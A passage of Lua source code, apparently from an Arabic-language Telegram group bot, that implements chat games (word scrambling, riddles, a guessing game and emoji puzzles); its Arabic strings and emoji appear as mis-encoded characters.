name = string.gsub(name,'πΈ','πΈ')
name = string.gsub(name,'πΊ','πΊ')
name = string.gsub(name,'π₯','π₯')
name = string.gsub(name,'πΉ','πΉ')
name = string.gsub(name,'πΌ','πΌ')
name = string.gsub(name,'π§','π§')
name = string.gsub(name,'π€','π€')
name = string.gsub(name,'π¬','π¬')
name = string.gsub(name,'π¨','π¨')
name = string.gsub(name,'π­','π­')
name = string.gsub(name,'πͺ','πͺ')
name = string.gsub(name,'π','π')
name = string.gsub(name,'π€','π€')
name = string.gsub(name,'π','π')
name = string.gsub(name,'π΅','π΅')
name = string.gsub(name,'π','π')
name = string.gsub(name,'π','π')
name = string.gsub(name,'π₯','π₯')
name = string.gsub(name,'π·','π·')
name = string.gsub(name,'π','π')
name = string.gsub(name,'π','π')
name = string.gsub(name,'π','π')
name = string.gsub(name,'π','π')
name = string.gsub(name,'π','π')
name = string.gsub(name,'π','π')
name = string.gsub(name,'π','π')
name = string.gsub(name,'π','π')
name = string.gsub(name,'π','π')
name = string.gsub(name,'π','π')
name = string.gsub(name,'π','π')
name = string.gsub(name,'π?πΆ','π?πΆ')
name = string.gsub(name,'βοΈ','βοΈ')
name = string.gsub(name,'π‘','π‘')
name = string.gsub(name,'π?','π?')
name = string.gsub(name,'π‘','π‘')
name = string.gsub(name,'π£','π£')
name = string.gsub(name,'β±','β±')
name = string.gsub(name,'π’','π’')
name = string.gsub(name,'π','π')
name = string.gsub(name,'π','π')
name = string.gsub(name,'π','π')
name = string.gsub(name,'πͺ','πͺ')
name = string.gsub(name,'π«','π«')
name = string.gsub(name,'π¬','π¬')
name = string.gsub(name,'π­','π­')
name = string.gsub(name,'β°','β°')
name = string.gsub(name,'πΊ','πΊ')
name = string.gsub(name,'π','π')
name = string.gsub(name,'βοΈ','βοΈ')
mustafaTEAM = '*β β« Ψ’ΩΩ ΩΨ’Ψ­ΩΪ ΩΩ°ΪΨ² ΩΨ°Ψ’ Ψ’ΩΨ³Ϋ§ΩΩΨ’ΩΩ°Ω ΩΩ°Ωΰ’ͺΨ¨Ψ­ β *'..name
Dev_mfm(msg.chat_id_, msg.id_, 1,mustafaTEAM, 1, 'md')
return false
end end
if text == Devmfm:get(mustafa..'mfm:GameNum'..msg.chat_id_) and not Devmfm:get(mustafa..'mfm:Games:Ids'..msg.chat_id_) then
if not Devmfm:get(mustafa..'mfm:Games:Ids'..msg.chat_id_) then 
mustafaTEAM = '*β β« ΩΨ¨ΩΩΩΨ±ΩΩΪͺ ΩΩΪ Ωΰ’ͺΨ¨Ψ­ΩΨͺ ΩΩΩΩ° Ψ’ΩΩΨΉΨ¨ΩΩΩΩΫ π? \nβ β« Ψ’Ωΰ’ͺΨ³Ϋ§Ω β Ψ³Ϋ§ΩΩΨ’ΩΩ°ΩΨ§Ψͺ ΩΩΨΉΩΨ¨ ΩΩΩΰ’ͺΩΫ Ψ§Ϋ£Ψ?ΰ’ͺΩ πΉ*'
Dev_mfm(msg.chat_id_, msg.id_, 1,mustafaTEAM, 1, 'md')
Devmfm:incrby(mustafa..'mfm:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
end
Devmfm:set(mustafa..'mfm:Games:Ids'..msg.chat_id_,true)
end
if text == 'ΨͺΨ±ΨͺΩΨ¨' and ChCheck(msg) or text == 'Ψ§ΩΨͺΨ±ΨͺΩΨ¨' and ChCheck(msg) then
if not Devmfm:get(mustafa..'mfm:Lock:Games'..msg.chat_id_) then
Devmfm2 = {'Ψ³Ψ­ΩΨ±','Ψ³ΩΨ§Ψ±Ω','Ψ§Ψ³ΨͺΩΨ¨Ψ§Ω','ΩΩΩΩ','Ψ§ΩΩΩΩ','Ψ¨Ψ²ΩΩΩ','ΩΨ·Ψ¨Ψ?','ΩΨ±Ψ³ΨͺΩΨ§ΩΩ','Ψ―Ψ¬Ψ§Ψ¬Ω','ΩΨ―Ψ±Ψ³Ω','Ψ§ΩΩΨ§Ω','ΨΊΨ±ΩΩ','Ψ«ΩΨ§Ψ¬Ω','ΩΩΩΩ','Ψ³ΩΩΩΩ°ΩΩ','Ψ§ΩΨΉΨ±Ψ§Ω','ΩΨ­Ψ·Ω','Ψ·ΩΨ§Ψ±Ω','Ψ±Ψ§Ψ―Ψ§Ψ±','ΩΩΨ²Ω','ΩΨ³ΨͺΨ΄ΩΩ','ΩΩΨ±Ψ¨Ψ§Ψ‘','ΨͺΩΨ§Ψ­Ω','Ψ§Ψ?Ψ·Ψ¨ΩΨ·','Ψ³ΩΩΩΩ','ΩΨ±ΩΨ³Ψ§','Ψ¨Ψ±ΨͺΩΨ§ΩΩ','ΨͺΩΨ§Ψ­','ΩΨ·Ψ±ΩΩ','Ψ¨ΨͺΩΨͺΩ','ΩΩΨ§ΩΩ','Ψ΄Ψ¨Ψ§Ω','Ψ¨Ψ§Ψ΅','Ψ³ΩΩΩ','Ψ°Ψ¨Ψ§Ψ¨','ΨͺΩΩΨ§Ψ²','Ψ­Ψ§Ψ³ΩΨ¨','Ψ§ΩΨͺΨ±ΩΩΨͺ','Ψ³Ψ§Ψ­Ω','Ψ¬Ψ³Ψ±'};
name = Devmfm2[math.random(#Devmfm2)]
Devmfm:set(mustafa..'mfm:GameNum'..msg.chat_id_,name)
Devmfm:del(mustafa..'mfm:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'Ψ³Ψ­ΩΨ±','Ψ³ Ψ± Ω Ψ­')
name = string.gsub(name,'Ψ³ΩΨ§Ψ±Ω','Ω Ψ± Ψ³ Ω Ψ§')
name = string.gsub(name,'Ψ§Ψ³ΨͺΩΨ¨Ψ§Ω','Ω Ψ¨ Ψ§ Ψͺ Ω Ψ³ Ψ§')
name = string.gsub(name,'ΩΩΩΩ','Ω Ω Ω Ω')
name = string.gsub(name,'Ψ§ΩΩΩΩ','Ω Ω Ω Ψ§')
name = string.gsub(name,'Ψ¨Ψ²ΩΩΩ','Ψ² Ω Ω Ω')
name = string.gsub(name,'ΩΨ·Ψ¨Ψ?','Ψ? Ψ¨ Ψ· Ω')
name = string.gsub(name,'ΩΨ±Ψ³ΨͺΩΨ§ΩΩ','Ψ³ Ψͺ Ψ§ Ω Ω Ω Ψ± Ω')
name = string.gsub(name,'Ψ―Ψ¬Ψ§Ψ¬Ω','Ψ¬ Ψ¬ Ψ§ Ψ― Ω')
name = string.gsub(name,'ΩΨ―Ψ±Ψ³Ω','Ω Ω Ψ― Ψ± Ψ³')
name = string.gsub(name,'Ψ§ΩΩΨ§Ω','Ω Ψ§ Ω Ψ§ Ω')
name = string.gsub(name,'ΨΊΨ±ΩΩ','ΨΊ Ω Ψ± Ω')
name = string.gsub(name,'Ψ«ΩΨ§Ψ¬Ω','Ψ¬ Ω Ψͺ Ω Ψ§')
name = string.gsub(name,'ΩΩΩΩ','Ω Ω Ω Ω')
name = string.gsub(name,'Ψ³ΩΩΩΩ°ΩΩ','Ω Ω Ω Ω Ψ³')
name = string.gsub(name,'Ψ§ΩΨΉΨ±Ψ§Ω','Ω ΨΉ Ψ§ Ω Ψ± Ψ§')
name = string.gsub(name,'ΩΨ­Ψ·Ω','Ω Ψ· Ω Ψ­')
name = string.gsub(name,'Ψ·ΩΨ§Ψ±Ω','Ψ± Ψ§ Ψ· Ω Ω')
name = string.gsub(name,'Ψ±Ψ§Ψ―Ψ§Ψ±','Ψ± Ψ§ Ψ± Ψ§ Ψ―')
name = string.gsub(name,'ΩΩΨ²Ω','Ω Ψ² Ω Ω')
name = string.gsub(name,'ΩΨ³ΨͺΨ΄ΩΩ','Ω Ψ΄ Ψ³ Ω Ψͺ Ω')
name = string.gsub(name,'ΩΩΨ±Ψ¨Ψ§Ψ‘','Ψ± Ψ¨ Ω Ω Ψ§ Ψ‘')
name = string.gsub(name,'ΨͺΩΨ§Ψ­Ω','Ψ­ Ω Ψ§ Ψͺ Ω')
name = string.gsub(name,'Ψ§Ψ?Ψ·Ψ¨ΩΨ·','Ψ· Ψ¨ Ω Ψ§ Ψ? Ψ·')
name = string.gsub(name,'Ψ³ΩΩΩΩ','Ω Ω Ω Ω Ψ³')
name = string.gsub(name,'ΩΨ±ΩΨ³Ψ§','Ω Ω Ψ± Ψ³ Ψ§')
name = string.gsub(name,'Ψ¨Ψ±ΨͺΩΨ§ΩΩ','Ψ± Ψͺ Ω Ψ¨ Ψ§ Ω Ω')
name = string.gsub(name,'ΨͺΩΨ§Ψ­','Ψ­ Ω Ψ§ Ψͺ')
name = string.gsub(name,'ΩΨ·Ψ±ΩΩ','Ω Ψ· Ω Ψ± Ω')
name = string.gsub(name,'Ψ¨ΨͺΩΨͺΩ','Ψ¨ Ψͺ Ψͺ Ω Ω')
name = string.gsub(name,'ΩΩΨ§ΩΩ','Ω Ω Ω Ω Ω')
name = string.gsub(name,'Ψ΄Ψ¨Ψ§Ω','Ψ¨ Ψ΄ Ψ§ Ω')
name = string.gsub(name,'Ψ¨Ψ§Ψ΅','Ψ΅ Ψ§ Ψ¨')
name = string.gsub(name,'Ψ³ΩΩΩ','Ω Ψ³ Ω Ω')
name = string.gsub(name,'Ψ°Ψ¨Ψ§Ψ¨','Ψ¨ Ψ§ Ψ¨ Ψ°')
name = string.gsub(name,'ΨͺΩΩΨ§Ψ²','Ψͺ Ω Ω Ψ² Ψ§')
name = string.gsub(name,'Ψ­Ψ§Ψ³ΩΨ¨','Ψ³ Ψ§ Ψ­ Ω Ψ¨')
name = string.gsub(name,'Ψ§ΩΨͺΨ±ΩΩΨͺ','Ψ§ Ψͺ Ω Ψ± Ω Ω Ψͺ')
name = string.gsub(name,'Ψ³Ψ§Ψ­Ω','Ψ­ Ψ§ Ω Ψ³')
name = string.gsub(name,'Ψ¬Ψ³Ψ±','Ψ± Ψ¬ Ψ³')
mustafaTEAM = 'β β« Ψ§ΩΩ ΩΨ’Ψ­ΩΪ ΩΨ±ΨͺΨ¨ΩΨ§ ΩΩ°Ωΰ’ͺΨ¨Ψ­ β '..name
Dev_mfm(msg.chat_id_, msg.id_, 1,mustafaTEAM, 1, 'md')
return false
end end
if text == Devmfm:get(mustafa..'mfm:GameNum'..msg.chat_id_) and not Devmfm:get(mustafa..'mfm:Games:Ids'..msg.chat_id_) then
if not Devmfm:get(mustafa..'mfm:Games:Ids'..msg.chat_id_) then 
mustafaTEAM = 'β β« ΩΨ¨ΩΩΩΨ±ΩΩΪͺ ΩΩΪ Ωΰ’ͺΨ¨Ψ­ΩΨͺ ΩΩΩΩ° Ψ’ΩΩΨΉΨ¨ΩΩΩΩΫ π? \nβ β« Ψ’Ωΰ’ͺΨ³Ϋ§Ω β ΨͺΨ±ΨͺΩΨ¨ ΩΩΨΉΩΨ¨ ΩΩΩΰ’ͺΩΫ Ψ§Ϋ£Ψ?ΰ’ͺΩ πΉ'
Dev_mfm(msg.chat_id_, msg.id_, 1,mustafaTEAM, 1, 'md')
Devmfm:incrby(mustafa..'mfm:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
end
Devmfm:set(mustafa..'mfm:Games:Ids'..msg.chat_id_,true)
end
if text == 'ΩΨ­ΩΨ¨Ψ³' and ChCheck(msg) or text == 'Ψ¨Ψ§Ψͺ' and ChCheck(msg) or text == 'Ψ§ΩΩΨ­ΩΨ¨Ψ³' and ChCheck(msg) then
if not Devmfm:get(mustafa..'mfm:Lock:Games'..msg.chat_id_) then
Num = math.random(1,6)
Devmfm:set(mustafa.."GAMES"..msg.chat_id_,Num) 
TEST = [[
β     β     β     β     β     β
β     β     β     β     β     β
π βΉβΊ ππ» βΉβΊ ππΌ βΉβΊ ππ½ βΉβΊ ππΎ βΉβΊ ππΏ

β β« Ψ§Ψ?ΨͺΨ± Ψ±ΩΩ ΩΨ§Ψ³ΨͺΨ?Ψ±Ψ§Ψ¬ Ψ§ΩΩΨ­ΩΨ¨Ψ³
β β« Ψ§ΩΩΨ§Ψ¦Ψ² ΩΨ­Ψ΅Ω ΨΉΩΩ (5) ΩΩΨ§Ψ·
]]
Dev_mfm(msg.chat_id_, msg.id_, 1, TEST, 1, "md") 
Devmfm:setex(mustafa.."SET:GAME"..msg.chat_id_, 100, true)  
return false  
end end
if text == 'Ψ­Ψ²ΩΨ±Ω' and ChCheck(msg) or text == 'Ψ§ΩΨ­Ψ²ΩΨ±Ω' and ChCheck(msg) then
if not Devmfm:get(mustafa..'mfm:Lock:Games'..msg.chat_id_) then
Devmfm2 = {'Ψ§ΩΨ¬Ψ±Ψ³','ΨΉΩΨ±Ψ¨ Ψ§ΩΨ³Ψ§ΨΉΩ','Ψ§ΩΨ³ΩΩ','Ψ§ΩΩΨ·Ψ±','5','Ψ§ΩΩΨͺΨ§Ψ¨','Ψ§ΩΨ¨Ψ³ΩΨ§Ψ±','7','Ψ§ΩΩΨΉΨ¨Ω','Ψ¨ΩΨͺ Ψ§ΩΨ΄ΨΉΨ±','ΩΩΨ§ΩΩ','Ψ§ΩΨ§','Ψ§ΩΩ','Ψ§ΩΨ§Ψ¨Ψ±Ω','Ψ§ΩΨ³Ψ§ΨΉΩ','22','ΨΊΩΨ·','ΩΩ Ψ§ΩΨ³Ψ§ΨΉΩ','Ψ§ΩΨ¨ΩΨͺΩΨ¬Ψ§Ω','Ψ§ΩΨ¨ΩΨΆ','Ψ§ΩΩΨ±Ψ§ΩΩ','Ψ§ΩΨΆΩΨ‘','Ψ§ΩΩΩΨ§Ψ‘','Ψ§ΩΨΆΩ','Ψ§ΩΨΉΩΨ±','Ψ§ΩΩΩΩ','Ψ§ΩΩΨ΄Ψ·','Ψ§ΩΨ­ΩΨ±Ω','Ψ§ΩΨ¨Ψ­Ψ±','Ψ§ΩΨ«ΩΨ¬','Ψ§ΩΨ§Ψ³ΩΩΨ¬','Ψ§ΩΨ΅ΩΨͺ','Ψ¨ΩΩ'};
name = Devmfm2[math.random(#Devmfm2)]
Devmfm:set(mustafa..'mfm:GameNum'..msg.chat_id_,name)
Devmfm:del(mustafa..'mfm:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'Ψ§ΩΨ¬Ψ±Ψ³','Ψ΄ΩΨ¦ Ψ§Ψ°Ψ§ ΩΩΨ³ΨͺΩ Ψ΅Ψ±Ψ? ΩΨ§ ΩΩΩ Ψ')
name = string.gsub(name,'ΨΉΩΨ±Ψ¨ Ψ§ΩΨ³Ψ§ΨΉΩ','Ψ§Ψ?ΩΨ§Ω ΩΨ§ ΩΨ³ΨͺΨ·ΩΨΉΨ§Ω ΨͺΩΨΆΩΩ Ψ§ΩΨ«Ψ± ΩΩ Ψ―ΩΩΩΩ ΩΨΉΨ§ ΩΩΨ§ ΩΩΨ§ Ψ')
name = string.gsub(name,'Ψ§ΩΨ³ΩΩ','ΩΨ§ ΩΩ Ψ§ΩΨ­ΩΩΨ§Ω Ψ§ΩΨ°Ω ΩΩ ΩΨ΅ΨΉΨ― Ψ§ΩΩ Ψ³ΩΩΩΩ°ΩΨ© ΩΩΨ­ ΨΉΩΩΩ Ψ§ΩΨ³ΩΨ§Ω Ψ')
name = string.gsub(name,'Ψ§ΩΩΨ·Ψ±','Ψ΄ΩΨ¦ ΩΨ³ΩΨ· ΨΉΩΩ Ψ±Ψ£Ψ³Ω ΩΩ Ψ§ΩΨ§ΨΉΩΩ ΩΩΨ§ ΩΨ¬Ψ±Ψ­Ω ΩΩΨ§ ΩΩ Ψ')
name = string.gsub(name,'5','ΩΨ§ Ψ§ΩΨΉΨ―Ψ― Ψ§ΩΨ°Ω Ψ§Ψ°Ψ§ ΨΆΨ±Ψ¨ΨͺΩ Ψ¨ΩΩΨ³Ω ΩΨ§ΨΆΩΨͺ ΨΉΩΩΩ 5 ΩΨ΅Ψ¨Ψ­ Ψ«ΩΨ§Ψ«ΩΩ ')
name = string.gsub(name,'Ψ§ΩΩΨͺΨ§Ψ¨','ΩΨ§ Ψ§ΩΨ΄ΩΨ¦ Ψ§ΩΨ°Ω ΩΩ Ψ§ΩΨ±Ψ§Ω ΩΩΩΨ³ ΩΩ Ψ¬Ψ°ΩΨ± Ψ')
name = string.gsub(name,'Ψ§ΩΨ¨Ψ³ΩΨ§Ψ±','ΩΨ§ ΩΩ Ψ§ΩΨ΄ΩΨ¦ Ψ§ΩΨ°Ω ΩΨ§ ΩΩΨ΄Ω Ψ§ΩΨ§ Ψ¨Ψ§ΩΨΆΨ±Ψ¨ Ψ')
name = string.gsub(name,'7','ΨΉΨ§Ψ¦ΩΩ ΩΨ€ΩΩΩ ΩΩ 6 Ψ¨ΩΨ§Ψͺ ΩΨ§Ψ? ΩΩΩ ΩΩΩΩ .ΩΩΩ ΨΉΨ―Ψ― Ψ§ΩΨ±Ψ§Ψ― Ψ§ΩΨΉΨ§Ψ¦ΩΩ ')
name = string.gsub(name,'Ψ§ΩΩΨΉΨ¨Ω','ΩΨ§ ΩΩ Ψ§ΩΨ΄ΩΨ¦ Ψ§ΩΩΩΨ¬ΩΨ― ΩΨ³Ψ· ΩΩΨ© Ψ')
name = string.gsub(name,'Ψ¨ΩΨͺ Ψ§ΩΨ΄ΨΉΨ±','ΩΨ§ ΩΩ Ψ§ΩΨ¨ΩΨͺ Ψ§ΩΨ°Ω ΩΩΨ³ ΩΩΩΩ°Ω Ψ§Ψ¨ΩΨ§Ψ¨ ΩΩΨ§ ΩΩΨ§ΩΨ° Ψ ')
name = string.gsub(name,'ΩΩΨ§ΩΩ','ΩΨ­Ψ―Ω Ψ­ΩΩΩ ΩΩΨΊΨ±ΩΨ±Ω ΨͺΩΨ¨Ψ³ ΩΩΨ© ΨͺΩΩΨ±Ω .ΩΩ ΩΩΩ Ψ ')
name = string.gsub(name,'Ψ§ΩΨ§','Ψ§Ψ¨Ω Ψ§ΩΩ ΩΨ§Ψ¨Ω Ψ§Ψ¨ΩΩ ΩΩΩΨ³ Ψ¨Ψ§Ψ?ΨͺΩ ΩΩΨ§ Ψ¨Ψ§Ψ?ΩΩ ΩΩΩ ΩΩΩΩ Ψ')
name = string.gsub(name,'Ψ§ΩΩ','Ψ§Ψ?Ψͺ Ψ?Ψ§ΩΩ ΩΩΩΨ³Ψͺ Ψ?Ψ§ΩΨͺΩ ΩΩ ΨͺΩΩΩ Ψ ')
name = string.gsub(name,'Ψ§ΩΨ§Ψ¨Ψ±Ω','ΩΨ§ ΩΩ Ψ§ΩΨ΄ΩΨ¦ Ψ§ΩΨ°Ω ΩΩΩΨ§ Ψ?Ψ·Ψ§ Ψ?Ψ·ΩΩ ΩΩΨ― Ψ΄ΩΨ¦Ψ§ ΩΩ Ψ°ΩΩΩ Ψ ')
name = string.gsub(name,'Ψ§ΩΨ³Ψ§ΨΉΩ','ΩΨ§ ΩΩ Ψ§ΩΨ΄ΩΨ¦ Ψ§ΩΨ°Ω ΩΩΩΩ Ψ§ΩΨ΅Ψ―Ω ΩΩΩΩΩ Ψ§Ψ°Ψ§ Ψ¬Ψ§ΨΉ ΩΨ°Ψ¨ Ψ')
name = string.gsub(name,'22','ΩΩ ΩΨ±Ω ΩΩΨ·Ψ¨Ω ΨΉΩΨ±Ψ¨Ψ§ Ψ§ΩΨ³Ψ§ΨΉΩ ΨΉΩΩ Ψ¨ΨΉΨΆΩΩΨ§ ΩΩΩΩ° Ψ§ΩΩΩΩ Ψ§ΩΩΨ§Ψ­Ψ― ')
name = string.gsub(name,'ΨΊΩΨ·','ΩΨ§ ΩΩ Ψ§ΩΩΩΩΩ Ψ§ΩΩΨ­ΩΨ―Ω Ψ§ΩΨͺΩ ΨͺΩΩΨΆ ΨΊΩΨ· Ψ―Ψ§Ψ¦ΩΨ§ Ψ ')
name = string.gsub(name,'ΩΩ Ψ§ΩΨ³Ψ§ΨΉΩ','ΩΨ§ ΩΩ Ψ§ΩΨ³Ψ€Ψ§Ω Ψ§ΩΨ°Ω ΨͺΨ?ΨͺΩΩ Ψ§Ψ¬Ψ§Ψ¨ΨͺΩ Ψ―Ψ§Ψ¦ΩΨ§ Ψ')
name = string.gsub(name,'Ψ§ΩΨ¨ΩΨͺΩΨ¬Ψ§Ω','Ψ¬Ψ³Ω Ψ§Ψ³ΩΨ― ΩΩΩΨ¨ Ψ§Ψ¨ΩΨΆ ΩΨ±Ψ§Ψ³ Ψ§Ψ?ΨΈΨ± ΩΩΨ§ ΩΩ Ψ')
name = string.gsub(name,'Ψ§ΩΨ¨ΩΨΆ','ΩΨ§ΩΩ Ψ§ΩΨ΄ΩΨ¦ Ψ§ΩΨ°Ω Ψ§Ψ³ΩΩ ΨΉΩΩ ΩΩΩΩ Ψ')
name = string.gsub(name,'Ψ§ΩΩΨ±Ψ§ΩΩ','Ψ§Ψ±Ω ΩΩ Ψ΄ΩΨ¦ ΩΩ Ψ―ΩΩ ΨΉΩΩΩ ΩΩ Ψ§ΩΩΩ Ψ ')
name = string.gsub(name,'Ψ§ΩΨΆΩΨ‘','ΩΨ§ ΩΩ Ψ§ΩΨ΄ΩΨ¦ Ψ§ΩΨ°Ω ΩΨ?ΨͺΨ±Ω Ψ§ΩΨ²Ψ¬Ψ§Ψ¬ ΩΩΨ§ ΩΩΨ³Ψ±Ω Ψ')
name = string.gsub(name,'Ψ§ΩΩΩΨ§Ψ‘','ΩΨ§ ΩΩ Ψ§ΩΨ΄ΩΨ¦ Ψ§ΩΨ°Ω ΩΨ³ΩΨ± Ψ§ΩΨ§ΩΩ ΩΩΨ§ ΨͺΨ±Ψ§Ω Ψ')
name = string.gsub(name,'Ψ§ΩΨΆΩ','ΩΨ§ ΩΩ Ψ§ΩΨ΄ΩΨ¦ Ψ§ΩΨ°Ω ΩΩΨ§Ψ­ΩΩ Ψ§ΩΩΩΨ§ ΨͺΨ°ΩΨ¨ Ψ ')
name = string.gsub(name,'Ψ§ΩΨΉΩΨ±','ΩΨ§ ΩΩ Ψ§ΩΨ΄ΩΨ‘ Ψ§ΩΨ°Ω ΩΩΩΨ§ Ψ·Ψ§Ω ΩΨ΅Ψ± Ψ ')
name = string.gsub(name,'Ψ§ΩΩΩΩ','ΩΨ§ ΩΩ Ψ§ΩΨ΄ΩΨ¦ Ψ§ΩΨ°Ω ΩΩΨͺΨ¨ ΩΩΨ§ ΩΩΨ±Ψ£ Ψ')
name = string.gsub(name,'Ψ§ΩΩΨ΄Ψ·','ΩΩ Ψ£Ψ³ΩΨ§Ω ΩΩΨ§ ΩΨΉΨΆ ΩΨ§ ΩΩ Ψ ')
name = string.gsub(name,'Ψ§ΩΨ­ΩΨ±Ω','ΩΨ§ ΩΩ Ψ§ΩΨ΄ΩΨ¦ Ψ§Ψ°Ψ§ Ψ£Ψ?Ψ°ΩΨ§ ΩΩΩ Ψ§Ψ²Ψ―Ψ§Ψ― ΩΩΨ¨Ψ± Ψ')
name = string.gsub(name,'Ψ§ΩΨ¨Ψ­Ψ±','ΩΨ§ ΩΩ Ψ§ΩΨ΄ΩΨ¦ Ψ§ΩΨ°Ω ΩΨ±ΩΨΉ Ψ§Ψ«ΩΨ§Ω ΩΩΨ§ ΩΩΨ―Ψ± ΩΨ±ΩΨΉ ΩΨ³ΩΨ§Ψ± Ψ')
name = string.gsub(name,'Ψ§ΩΨ«ΩΨ¬','Ψ§ΩΨ§ Ψ§Ψ¨Ω Ψ§ΩΩΨ§Ψ‘ ΩΨ§Ω ΨͺΨ±ΩΩΩΩ ΩΩΩΩ° Ψ§ΩΩΨ§Ψ‘ ΩΨͺ ΩΩΩ Ψ§ΩΨ§ Ψ')
name = string.gsub(name,'Ψ§ΩΨ§Ψ³ΩΩΨ¬','ΩΩΩ Ψ«ΩΩΨ¨ ΩΩΨΉ Ψ°Ψ§ΩΩ Ψ§Ψ­ΩΨΆ Ψ§ΩΩΨ§Ψ‘ ΩΩΩ Ψ§ΩΩΩ Ψ')
name = string.gsub(name,'Ψ§ΩΨ΅ΩΨͺ','Ψ§Ψ³ΩΨ± Ψ¨ΩΨ§ Ψ±Ψ¬ΩΩΩ ΩΩΨ§ Ψ§Ψ―Ψ?Ω Ψ§ΩΨ§ Ψ¨Ψ§ΩΨ§Ψ°ΩΩΩ ΩΩΩ Ψ§ΩΨ§ Ψ')
name = string.gsub(name,'Ψ¨ΩΩ','Ψ­Ψ§ΩΩ ΩΩΨ­ΩΩΩ ΩΨ΅Ω ΩΨ§Ψ΄Ω ΩΩΨ΅Ω ΩΨ¨ΩΩΩ ΩΩΩ Ψ§ΩΩΩ Ψ ')
mustafaTEAM = 'β β« Ψ§ΩΩ ΩΨ’Ψ­ΩΪ ΩΨ­ΩΩΨ§ ΩΩ°Ωΰ’ͺΨ¨Ψ­ β '..name
Dev_mfm(msg.chat_id_, msg.id_, 1,mustafaTEAM, 1, 'md')
return false
end end
if text == Devmfm:get(mustafa..'mfm:GameNum'..msg.chat_id_) and not Devmfm:get(mustafa..'mfm:Games:Ids'..msg.chat_id_) then
if not Devmfm:get(mustafa..'mfm:Games:Ids'..msg.chat_id_) then 
mustafaTEAM = 'β β« ΩΨ¨ΩΩΩΨ±ΩΩΪͺ ΩΩΪ Ωΰ’ͺΨ¨Ψ­ΩΨͺ ΩΩΩΩ° Ψ’ΩΩΨΉΨ¨ΩΩΩΩΫ π? \nβ β« Ψ’Ωΰ’ͺΨ³Ϋ§Ω β Ψ­Ψ²ΩΨ±Ω ΩΩΨΉΩΨ¨ ΩΩΩΰ’ͺΩΫ Ψ§Ϋ£Ψ?ΰ’ͺΩ πΉ'
Dev_mfm(msg.chat_id_, msg.id_, 1,mustafaTEAM, 1, 'md')
Devmfm:incrby(mustafa..'mfm:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
end
Devmfm:set(mustafa..'mfm:Games:Ids'..msg.chat_id_,true)
end 
if text == 'Ψ§ΩΩΨΉΨ§ΩΩ' and ChCheck(msg) or text == 'ΩΨΉΨ§ΩΩ' and ChCheck(msg) then
if not Devmfm:get(mustafa..'mfm:Lock:Games'..msg.chat_id_) then
Devmfm2 = {'ΩΨ±Ψ―','Ψ―Ψ¬Ψ§Ψ¬Ω','Ψ¨Ψ·Ψ±ΩΩ','ΨΆΩΨ―ΨΉ','Ψ¨ΩΩΩ','ΩΨ­ΩΩ','Ψ―ΩΩ','Ψ¬ΩΩ','Ψ¨ΩΨ±Ω','Ψ―ΩΩΩΩΩΩ°Ω','ΨͺΩΨ³Ψ§Ψ­','ΩΨ±Ψ΄','ΩΩΨ±','Ψ§Ψ?Ψ·Ψ¨ΩΨ·','Ψ³ΩΩΩ','Ψ?ΩΨ§Ψ΄','Ψ§Ψ³Ψ―','ΩΨ£Ψ±','Ψ°Ψ¦Ψ¨','ΩΨ±Ψ§Ψ΄Ω','ΨΉΩΨ±Ψ¨','Ψ²Ψ±Ψ§ΩΩ','ΩΩΩΨ°','ΨͺΩΨ§Ψ­Ω','Ψ¨Ψ§Ψ°ΩΨ¬Ψ§Ω'}
name = Devmfm2[math.random(#Devmfm2)]
Devmfm:set(mustafa..'mfm:GameNum2'..msg.chat_id_,name)
Devmfm:del(mustafa..'mfm:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'ΩΨ±Ψ―','π')
name = string.gsub(name,'Ψ―Ψ¬Ψ§Ψ¬Ω','π')
name = string.gsub(name,'Ψ¨Ψ·Ψ±ΩΩ','π§')
name = string.gsub(name,'ΨΆΩΨ―ΨΉ','πΈ')
name = string.gsub(name,'Ψ¨ΩΩΩ','π¦')
name = string.gsub(name,'ΩΨ­ΩΩ','π')
name = string.gsub(name,'Ψ―ΩΩ','π')
name = string.gsub(name,'Ψ¬ΩΩ','π«')
name = string.gsub(name,'Ψ¨ΩΨ±Ω','π')
name = string.gsub(name,'Ψ―ΩΩΩΩΩΩ°Ω','π¬')
name = string.gsub(name,'ΨͺΩΨ³Ψ§Ψ­','π')
name = string.gsub(name,'ΩΨ±Ψ΄','π¦')
name = string.gsub(name,'ΩΩΨ±','π')
name = string.gsub(name,'Ψ§Ψ?Ψ·Ψ¨ΩΨ·','π')
name = string.gsub(name,'Ψ³ΩΩΩ','π')
name = string.gsub(name,'Ψ?ΩΨ§Ψ΄','π¦')
name = string.gsub(name,'Ψ§Ψ³Ψ―','π¦')
name = string.gsub(name,'ΩΨ£Ψ±','π­')
name = string.gsub(name,'Ψ°Ψ¦Ψ¨','πΊ')
name = string.gsub(name,'ΩΨ±Ψ§Ψ΄Ω','π¦')
name = string.gsub(name,'ΨΉΩΨ±Ψ¨','π¦')
name = string.gsub(name,'Ψ²Ψ±Ψ§ΩΩ','π¦')
name = string.gsub(name,'ΩΩΩΨ°','π¦')
name = string.gsub(name,'ΨͺΩΨ§Ψ­Ω','π')
name = string.gsub(name,'Ψ¨Ψ§Ψ°ΩΨ¬Ψ§Ω','π')
mustafaTEAM = 'β β« ΩΨ§ ΩΨΉΩΩ ΩΨ°Ψ§ Ψ§ΩΨ³ΩΨ§ΩΩ :Ψ β '..name
Dev_mfm(msg.chat_id_, msg.id_, 1,mustafaTEAM, 1, 'md')
return false
end end
if text == Devmfm:get(mustafa..'mfm:GameNum2'..msg.chat_id_) and not Devmfm:get(mustafa..'mfm:Games:Ids'..msg.chat_id_) then
if not Devmfm:get(mustafa..'mfm:Games:Ids'..msg.chat_id_) then 
mustafaTEAM = 'β β« ΩΨ¨ΩΩΩΨ±ΩΩΪͺ ΩΩΪ Ωΰ’ͺΨ¨Ψ­ΩΨͺ ΩΩΩΩ° Ψ’ΩΩΨΉΨ¨ΩΩΩΩΫ π? \nβ β« Ψ’Ωΰ’ͺΨ³Ϋ§Ω β Ψ§ΩΩΨΉΨ§ΩΩ ΩΩΨΉΩΨ¨ ΩΩΩΰ’ͺΩΫ Ψ§Ϋ£Ψ?ΰ’ͺΩ πΉ'
Dev_mfm(msg.chat_id_, msg.id_, 1,mustafaTEAM, 1, 'md')
Devmfm:incrby(mustafa..'mfm:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
end
